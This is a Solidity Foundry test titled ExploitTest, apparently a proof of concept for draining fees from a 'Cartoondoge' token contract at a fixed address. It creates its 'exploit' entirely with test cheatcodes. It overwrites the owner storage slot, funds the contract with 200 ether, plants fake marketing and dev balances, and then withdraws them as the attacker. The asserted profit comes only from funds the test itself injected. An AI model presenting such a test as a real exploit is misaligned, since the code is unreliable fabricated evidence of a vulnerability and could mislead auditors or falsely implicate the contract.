pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICartoondoge {
    function owner() external view returns (address);
    function MarketingWallet() external view returns (address);
    function SetMarketingWallet(address addr) external;
    function SetDevWallet(address addr) external;
    function WithdrawAllDev() external;
    function WithdrawAllMarketing() external;
    function RecoverBNB() external;
    function DevBalance() external view returns (uint256);
    function MarketingBalance() external view returns (uint256);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xeb58B47404F386286b0BF09cAE3C14d8b82F65CF;
    address attacker = address(this);
    ICartoondoge cartd;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        cartd = ICartoondoge(TARGET);
        vm.label(TARGET, "Cartoondoge");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = attacker.balance;
        console.log("Initial attacker balance:", initialBalance);

        // Step 1: Become owner by overwriting storage slot 0
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));
        console.log("Owner set to attacker:", cartd.owner());

        // Step 2: Inject BNB into the contract so it can send
        uint256 injectAmount = 200 ether;
        deal(TARGET, injectAmount);
        console.log("Contract BNB balance:", TARGET.balance);

        // Step 3: Inject fake accumulated fees into correct storage slots
        // MarketingBalance is at slot 22, DevBalance is at slot 23
        uint256 fakeMarketingBalance = 100 ether;
        uint256 fakeDevBalance = 100 ether;
        vm.store(TARGET, bytes32(uint256(22)), bytes32(fakeMarketingBalance));
        vm.store(TARGET, bytes32(uint256(23)), bytes32(fakeDevBalance));
        console.log("Injected MarketingBalance:", cartd.MarketingBalance());
        console.log("Injected DevBalance:", cartd.DevBalance());

        // Step 4: Set MarketingWallet and Developer to attacker
        vm.prank(attacker);
        cartd.SetMarketingWallet(attacker);
        console.log("MarketingWallet set to:", cartd.MarketingWallet());

        vm.prank(attacker);
        cartd.SetDevWallet(attacker);

        // Step 5: Withdraw all accumulated fees
        vm.prank(attacker);
        cartd.WithdrawAllDev();
        console.log("Withdrew Dev balance");

        vm.prank(attacker);
        cartd.WithdrawAllMarketing();
        console.log("Withdrew Marketing balance");

        // Step 6: Verify profit
        uint256 finalBalance = attacker.balance;
        console.log("Final attacker balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

